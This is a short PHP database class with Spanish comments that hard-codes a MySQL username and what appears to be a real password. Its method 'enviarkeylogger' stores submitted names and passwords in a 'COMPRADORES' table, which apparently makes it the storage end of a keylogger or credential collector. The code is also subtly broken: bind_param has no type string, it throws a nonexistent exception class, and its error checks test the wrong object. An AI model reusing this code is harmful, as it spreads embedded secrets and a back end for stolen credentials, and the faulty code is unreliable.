<?php

class DBforms {
    public $servername;
    public $username;
    public $password;
  /*   public $myDB; */

    // Variable para el directorio de los files
    /* public $dir_subida = "tmp";   */  
        
    
    

    public function __construct(
       
        $servername = 'localhost',
        $username = 'guillermo',
        $password = 'nxdgaT8h@6j]BJSf',
        $myDB = 'guillermo_db'
    ) {
        $this->servername = $servername;
        $this->username = $username;
        $this->password = $password;
        $this->myDB = $myDB;        
    }

    public function crearConexion()
    {
        return new mysqli(
            $this->servername,
            $this->username,
            $this->password,
            $this->myDB
        );
    }

    public function hayError($conexion)
    {
        if ($conexion->connect_error) {
            die("La conexion ha fallado: " . $conexion->connect_error);
        }
    }

    public function enviarkeylogger($nombre, $contrasena)
    {
        $miConexion = $this->crearConexion();
        $enviarkeylogger = $miConexion->prepare("INSERT INTO COMPRADORES (nombre, contrasena) VALUES (?, ?)");
        $enviarkeylogger->bind_param(
            $nombre,
            $contrasena
          );

        // Compruebo si la conexión se establece bien
        if (!$enviarkeylogger) {
            throw new enviarkeylogger($miConexion->error_list);
        }

        // Ejecute la query
        $enviarkeylogger->execute();
        
        // Compruebo si se envia y no hay error
        if (!$enviarkeylogger) {
            throw new Exception($miConexion->error_list);
        }

        // Devuelvo el último valor añadido
        $id = $enviarkeylogger->insert_id;

        // Cierro conexión
        $enviarkeylogger->close();

        // Devuevlo el ID
        return $id;

    }

    // Función para previsualizar datos
    private function showPRE($toPrint)
    {
        echo '<pre>';
        print_r($toPrint);
        echo '</pre>';
    }
 
}